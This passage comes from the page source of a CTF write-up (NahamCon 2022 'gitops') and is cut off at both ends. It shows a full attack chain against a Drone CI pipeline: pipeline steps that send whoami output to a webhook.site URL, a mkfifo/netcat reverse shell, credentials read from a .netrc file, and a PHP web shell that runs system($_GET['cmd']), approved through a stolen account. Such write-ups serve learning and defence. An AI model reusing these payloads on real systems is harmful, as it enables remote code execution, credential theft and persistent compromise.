punctuation\",children:\"-\"}),\" curl https\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\"//webhook.site/2289b2a6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"580c\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"4091\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"90a4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`4356e97c6fc0/$(whoami)\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" wget https\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),\"//webhook.site/2289b2a6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"580c\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"4091\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"90a4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`4356e97c6fc0/$(whoami)\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/drone_whoami.png\",alt:\"Initial Testing\"})}),`\n`,(0,e.jsxs)(n.p,{children:[(0,e.jsx)(n.strong,{children:\"Note:\"}),\" We inserted a request with \",(0,e.jsx)(n.code,{children:\"curl\"}),\" and with \",(0,e.jsx)(n.code,{children:\"wget\"}),\" in case one of them is not installed on the system.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We can now check our webhook to see if the commands were successfully executed, and we can see two new requests, one with \",(0,e.jsx)(n.code,{children:\"curl\"}),\" and one with \",(0,e.jsx)(n.code,{children:\"wget\"}),\". It worked, and we even have root privileges over the target machine!\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/webhook_whoami.png\",alt:\"Webhook.site Result\"})}),`\n`,(0,e.jsxs)(n.h2,{id:\"bonus-how-to-get-command-output-without-webhook\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#bonus-how-to-get-command-output-without-webhook\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Bonus: How to get command output without webhook\"]}),`\n`,(0,e.jsx)(n.p,{children:\"In this challenge, the target machine is connected to internet, but what if it was only accessible within the local network, or if it had a very strict firewall policy and you can\\u2019t exfiltrate data via the WAN network ?\"}),`\n`,(0,e.jsx)(n.p,{children:\"This is where the drone application can help us, when we access the Drone web UI, we can see the result of our command in the output log.\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/nahamcon-ctf-2022/gitops/output_whoami.png\",alt:\"DroneCI output for initial testing\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We could do all our enumeration processes and root the target box this way, but it would be quite repetitive to create a new commit for each command then go to DroneCI to check the output...\"}),`\n`,(0,e.jsxs)(n.h2,{id:\"getting-reverse-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#getting-reverse-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Getting Reverse shell\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will reproduce the same steps as the \",(0,e.jsx)(n.code,{children:\"whoami\"}),\" command execution, but instead, we used some simple commands to gather more information about the target system.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-yaml\",children:(0,e.jsxs)(n.code,{className:\"language-yaml code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"steps\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"name\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),` linting\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token key atrule\",children:\"commands\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" phplint \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`lint .\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" uname \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`a\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),` cat /etc/issue\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" find $(echo $PATH \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"|\"}),\" sed 's/\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`/ /g')\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"      \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\" find / \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),\"perm /o+w \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"-\"}),`type d\n`]})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"stripped-output-response\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stripped-output-response\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stripped output Response\"]}),`\n`,(0,e.jsx)(n.p,{children:\"We only keep the most relevant data, to keep this list smaller but we had every binary on the default Environment Path\"}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`+ uname -a\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Linux gitops-5edbd6bd8fd79ba1-c77694485-8gjlx 5.4.144+ #1 SMP Wed Nov 3 09:56:10 PDT 2021 x86_64 Linux\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ cat /etc/issue\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Welcome to Alpine Linux 3.15\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`Kernel \\\\r on an \\\\m (\\\\l)\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ find $(echo $PATH | sed 's/:/ /g')\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/local/bin/php\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/wget\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/nc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/whoami\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/mkfifo\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-receive-pack\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-upload-pack\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-upload-archive\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/git-shell\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/usr/bin/curl\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/sh\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/base64\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/mktemp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/ash\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/bin/busybox\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`+ find / -perm /o+w -type d\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/var/tmp\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/var/www/html\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/dev/shm\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp\n`})]})}),`\n`,(0,e.jsxs)(n.h3,{id:\"key-points\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#key-points\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Key Points\"]}),`\n`,(0,e.jsxs)(n.ul,{children:[`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We do not have \",(0,e.jsx)(n.code,{children:\"bash\"}),\" but we have access to \",(0,e.jsx)(n.code,{children:\"ash\"}),\" and \",(0,e.jsx)(n.code,{children:\"sh\"})]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"We can write in the \",(0,e.jsx)(n.code,{children:\"/tmp\"}),\" folder\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsxs)(n.p,{children:[\"No \",(0,e.jsx)(n.code,{children:\"python\"}),\", but \",(0,e.jsx)(n.code,{children:\"Perl\"}),\" and \",(0,e.jsx)(n.code,{children:\"nc\"}),\" are present\"]}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"Running Alpine Linux 3.15, which is a based on busybox, so limited commands\"}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"x86_64 Linux If we would like to compile executable for the target\"}),`\n`]}),`\n`,(0,e.jsxs)(n.li,{children:[`\n`,(0,e.jsx)(n.p,{children:\"We could use the Git CLI from this box to interact with the Repo instead of the Web UI\"}),`\n`]}),`\n`]}),`\n`,(0,e.jsxs)(n.h3,{id:\"generating-the-payload\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#generating-the-payload\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Generating the payload\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"With these information, there are multiple ways of gaining a remote shell on the target computer, we choose the following payload for this challenge, repeat the previous steps and include it in \",(0,e.jsx)(n.code,{children:\"drone.yml\"})]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsx)(n.code,{className:\"code-highlight\",children:(0,e.jsx)(n.span,{className:\"code-line\",children:`mkfifo /tmp/f;cat /tmp/f|sh -i 2\u003e\u00261|nc x.x.x.x 80 \u003e/tmp/f\n`})})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Start a listener on the selected port and catch the reverse shell with \",(0,e.jsx)(n.code,{children:\"nc -lnvp 80\"})]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-shell\",children:(0,e.jsxs)(n.code,{className:\"language-shell code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"nc\"}),\" -lnvp \",(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"listening on \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),\"any\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"80\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"connect to \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"192.168\"}),\".0.181\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" from \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"UNKNOWN\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"192.168\"}),\".0.149\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"51978\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/bin/ash: can't access \",(0,e.jsx)(n.span,{className:\"token function\",children:\"tty\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` job control turned off\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/tmp/drone-u2aFxfYSGZ02aua6/done/src \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# whoami \u0026\u0026 id \u0026\u0026 ip a\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`root\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"uid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"gid\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"root\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token assign-left variable\",children:\"groups\"}),(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"bin\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",2\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"daemon\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",3\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"sys\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",4\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"adm\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",6\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"disk\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",10\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"wheel\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",11\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"floppy\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",20\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dialout\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",26\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"tape\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\",27\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"video\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"1\"}),\": lo: \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"LOOPBACK,UP,LOWER_UP\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" mtu \",(0,e.jsx)(n.span,{className:\"token number\",children:\"65536\"}),\" qdisc noqueue state UNKNOWN qlen \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1000\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    inet \",(0,e.jsx)(n.span,{className:\"token number\",children:\"127.0\"}),\".0.1/8 scope \",(0,e.jsx)(n.span,{className:\"token function\",children:\"host\"}),` lo\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        valid_lft forever preferred_lft forever\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token number\",children:\"2\"}),\": eth0@if2010: \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003c\"}),\"BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"\u003e\"}),\" mtu \",(0,e.jsx)(n.span,{className:\"token number\",children:\"1040\"}),` qdisc noqueue state UP \n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`    link/ether ea:9c:38:bf:2f:e6 brd ff:ff:ff:ff:ff:ff\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"    inet \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.112\"}),\".9.241/32 brd \",(0,e.jsx)(n.span,{className:\"token number\",children:\"10.112\"}),`.9.241 scope global eth0\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`        valid_lft forever preferred_lft forever\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"/tmp/drone-u2aFxfYSGZ02aua6/done/src \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"#\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"post-exploitation\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#post-exploitation\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Post Exploitation\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Looking around the system, we found a really interesting file in the \",(0,e.jsx)(n.em,{children:\"Docker DroneCi Home folder\"}),\" named \",(0,e.jsx)(n.code,{children:\".netrc\"}),\", we took a look inside, we had credentials for another user. We tried them against the Gitea application and successfully logged in as \",(0,e.jsx)(n.em,{children:\"DroneCI\"}),\":\"]}),`\n`,(0,e.jsx)(n.pre,{children:(0,e.jsxs)(n.code,{className:\"code-highlight\",children:[(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp/drone-u2aFxfYSGZ02aua6/home/drone # cat .netrc\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`machine git.challenge.nahamcon.com login droneci password t4K0@s!qSF\n`}),(0,e.jsx)(n.span,{className:\"code-line\",children:`/tmp/drone-u2aFxfYSGZ02aua6/home/drone #\n`})]})}),`\n`,(0,e.jsxs)(n.h2,{id:\"pivoting-to-web-server\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#pivoting-to-web-server\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Pivoting to Web Server\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"Remember in the \",(0,e.jsx)(n.code,{children:\"README.md\"}),\", we had to get someone else to approve our code before it gets merged into the Master Branch. We will use our newly discovered account to approve our malicious commit.\"]}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will add a simple command execution form in the \",(0,e.jsx)(n.code,{children:\"index.php\"}),\" file, and I always like to put a \",(0,e.jsx)(n.code,{children:\"phpinfo();\"}),\", This ways, if per example \",(0,e.jsx)(n.code,{children:\"system()\"}),\" command is disabled on the server, with the \",(0,e.jsx)(n.code,{children:\"phpinfo\"}),\", I will be able to confirm I can execute PHP code, and you should be able to view which functions are restricted and tons of useful information on the target.\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-php\",children:(0,e.jsxs)(n.code,{className:\"language-php code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"form\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"method\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"GET\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"name\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"\u003c?php\"}),\" \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"echo\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"basename\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_SERVER\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'PHP_SELF'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" \",(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?\u003e\"})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"input\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"type\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"TEXT\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"name\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"cmd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"id\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"cmd\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"size\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"80\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"/\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"  \",(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"input\"]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"type\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"SUBMIT\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token attr-name\",children:\"value\"}),(0,e.jsxs)(n.span,{className:\"token attr-value\",children:[(0,e.jsx)(n.span,{className:\"token punctuation attr-equals\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'}),\"Execute\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:'\"'})]}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"/\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"form\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"\u003c?php\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"if\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token keyword\",children:\"isset\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_GET\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'cmd'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"{\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"        \",(0,e.jsx)(n.span,{className:\"token function\",children:\"system\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token global\",children:\"$_GET\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string single-quoted-string\",children:\"'cmd'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"}\"}),`\n`]})}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token php language-php\",children:(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"?\u003e\"})}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c/\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsxs)(n.span,{className:\"token tag\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003c\"}),\"pre\"]}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"\u003e\"})]}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[(0,e.jsx)(n.span,{className:\"token delimiter important\",children:\"\u003c?php\"}),`\n`]})}),(0,e.jsx)(n.span,{className:\"code-line\",children:(0,e.jsxs)(n.span,{className:\"token php language-php\",children:[\"    \",(0,e.jsx)(n.span,{className:\"token function\",children:\"phpinfo\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token 